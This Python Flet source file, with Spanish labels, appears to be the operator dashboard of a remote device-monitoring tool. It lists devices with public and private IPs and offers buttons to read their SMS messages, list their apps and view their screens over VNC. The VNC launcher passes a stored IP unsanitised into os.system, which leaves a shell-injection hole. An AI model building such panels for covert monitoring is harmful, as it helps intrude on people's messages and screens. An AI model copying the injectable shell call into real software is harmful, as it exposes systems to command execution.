from flet import (
    Column,
    Text,
    Container,
    Page,
    IconButton,
    icons,
    FontWeight,
    DataRow,
    TextAlign,
    DataCell, 
    TextButton,
    Padding,
    DataTable,
    border,
    DataColumn,
    Row,
    alignment,
    colors,
    LinearGradient,
    ListView,
    border_radius,
    
    
)   


from db.script import ReadTableDb
from os import system

listaIDAPP = []
listaIDSMS = []
listaIDDevice = []
listIPDevice = []
listIPDevice1 = []
listNameDevice = []
def IndexView(page: Page):
    
    def AccessMoreInfoDevice(e, idDevice, ipPublicDevice, ipPrivateDevice, nameUser):
        listaIDDevice.clear()
        listaIDDevice.append(idDevice)
        listIPDevice.clear()
        listIPDevice.append(ipPublicDevice)
        listIPDevice1.clear()
        listIPDevice1.append(ipPrivateDevice)
        listNameDevice.clear()
        listNameDevice.append(nameUser)
        page.go("/index/ExtraInfoDevice")
        
    
         
        
    def ActionButtonVncServer(e, ipServer, idDevice, nameDevice):
        listaIDDevice.clear()
        listaIDDevice.append(idDevice)
        listNameDevice.clear()
        listNameDevice.append(nameDevice)
        page.go("/index/ExtraInfoDevice/vnc_server")
        system(f"./bins/vncviewer -geometry 405x610+412+140 {ipServer}:5300")
                
    
    def DefineDataColumn(nameColumn: str,
                         color: str,
                         size: int,
                         grosor: FontWeight):
        
        return(
            Text(nameColumn, 
                width=size,
                color = color,
                weight=grosor,
                text_align= TextAlign.LEFT,
                )    
        )
        
    
    def GoToViewSms(e, param):
        listaIDSMS.clear() 
        listaIDSMS.append(param)
        page.go("/index/viewSMS")
        
    def GoToApps(e, param):
        listaIDAPP.clear()
        listaIDAPP.append(param)
        page.go("/index/viewApps") 
        
        
    def DefineDataRowTest(data_tuple):
        idDevice, device, ipPublic, ipPrivate = data_tuple
        
        return DataRow(
            cells=[
                DataCell(Text(idDevice)),
                DataCell(
                        IconButton(
                            icon=icons.INFO_ROUNDED,
                            icon_color="blue400",
                            icon_size=20,
                            tooltip="Información",
                            on_click=lambda e: AccessMoreInfoDevice(e, idDevice, ipPublic, ipPrivate, device)
                        )
                    ),
                DataCell(Text(device)),
                DataCell(Text(ipPublic)),
                DataCell(Text(ipPrivate)),
                DataCell(TextButton("mirar mensajes", on_click=lambda e: GoToViewSms(e, idDevice))),
                DataCell(TextButton("mirar aplicaciones", on_click=lambda e: GoToApps(e, idDevice))),
                DataCell(   
                        IconButton(
                            icon=icons.PLAY_CIRCLE,
                            icon_color="blue400",
                            icon_size=20,
                            tooltip="ver pantalla",
                            on_click=lambda e: ActionButtonVncServer(e, ipPrivate, idDevice, device)
                            )
                        ),
                    ]
            )
        
        
    def OptionsMenu():
        return(
            Container(  
                margin=Padding(top=0, bottom=30, left=0, right=0),
                alignment=alignment.top_center,   
                content= (
                    Column(    
                        controls=[
                            Row(
                                controls=[
                                    TextButton("Archivo"),
                                    TextButton("Editar"),
                                    TextButton("Selección"),
                                    TextButton("Ver"),
                                    TextButton("Ir"),
                                    TextButton("Ayuda")
                                ]
                            )
                        ],
                    
                    )
                )
            )
        )        
        

    def DateTableDevices():
        table = DataTable(
                vertical_lines=border.BorderSide(3, "blue"),
                horizontal_lines=border.BorderSide(1, "white"),
                #border=ft.border.all(2, "red"),
                columns=[
                    
                    DataColumn(DefineDataColumn("ID",
                                                   "white", 
                                                   50,
                                                   FontWeight.W_800),
                                  numeric=True),
                    DataColumn(DefineDataColumn("Info",
                                                   "white",
                                                   55,
                                                   FontWeight.W_400
                                                   ),
                                  ),
                     
                    DataColumn(DefineDataColumn("Dispositivos",
                                                   "white",
                                                   100,
                                                   FontWeight.NORMAL
                                                   ),
                                  ),
                    
                    DataColumn(DefineDataColumn("IP(Pública)",
                                                   "white",
                                                   100,
                                                   FontWeight.NORMAL
                                                   ),
                                  ),
                    
                    DataColumn(DefineDataColumn("IP(Privada)",
                                                   "white",
                                                   100,
                                                   FontWeight.NORMAL
                                                   ),
                                  ),
                    
                    
                    DataColumn(DefineDataColumn("Mensajes de Texto",
                                                   "white",
                                                   120,
                                                   FontWeight.NORMAL
                                                   ),
                                  ),
                    
                    DataColumn(DefineDataColumn("Visualizar Alicaciones",
                                                   "white",
                                                   100,
                                                   FontWeight.NORMAL
                                                   ),
                                  ),
                    
                    DataColumn(DefineDataColumn("Visualizar pantalla(VNC)",
                                                   "white",
                                                   100,
                                                   FontWeight.NORMAL),
                                  ),
                    
                ],
                
                
                rows=[],#usamos append para agregar las filas a el DataColumn
                
            )

        
        contenedor = Container(
            border_radius=border_radius.all(12),
            gradient=LinearGradient(
            begin=alignment.top_center,
            end=alignment.bottom_center,
            colors=["#000000", colors.BLUE_900],  #Le ponemos un degradado entre negro y azúl por el momento      
            ),
            
            content=table
        )
        
        #Usamos esta función para Actualizar las filas de la DataTable
        def AggRows(e):
            dataDB = ReadTableDb(
                "db/dataDevices.db",
                """
                    SELECT * FROM info_devices
                
                """)
            
            contenedor.content.rows.clear()
            
            data_rows = [DefineDataRowTest(data_tuple) for data_tuple in dataDB]
            
            for i in data_rows:
                contenedor.content.rows.append(i)
            
            page.update()#Actualizamos toda la página
        
        
            
        #Función de ejemplo para eliminar filas de una DataTable 
        def DeleteRows(e):
            contenedor.content.rows.pop()
            page.update()
                
  
        dataDB = ReadTableDb(
                "db/dataDevices.db",
                """
                    SELECT * FROM info_devices
                
                """)
        
        data_rows = [DefineDataRowTest(data_tuple) for data_tuple in dataDB]
        for data_tuple, i in zip(dataDB, data_rows):
            id_app, b, c, d,= data_tuple
            #print(id_Message)
            contenedor.content.rows.append(i)
        
        
        #Mostramos por pantalla la DataTable refrescada
        refresh = IconButton(
            icon=icons.REFRESH_OUTLINED,
            on_click=AggRows, data=0,
            icon_color="blue500",
            icon_size="30",
            tooltip="recargar datos"
            )
        
        #boton1 = ElevatedButton("Delete", on_click=DeleteRows) #Así sería un ejemplo de botón para eliminar datos
        
        todo = Column(
                controls=[
                    refresh,
                    contenedor
                    
                ]
            )
        
        lv = ListView(expand=1, spacing=10, padding=20, auto_scroll=False)
        lv.controls.append(todo)
        return (lv)
    
        
    #ClientSocketConnection() #TEST: Usariamos el ClienteSocket para usar el programa por cli
    viewIndex = [
        OptionsMenu(),
        DateTableDevices()
        
    ]
    
    #ExecuteInsertDataDevice()
    
    return (
        
        viewIndex
    
    )
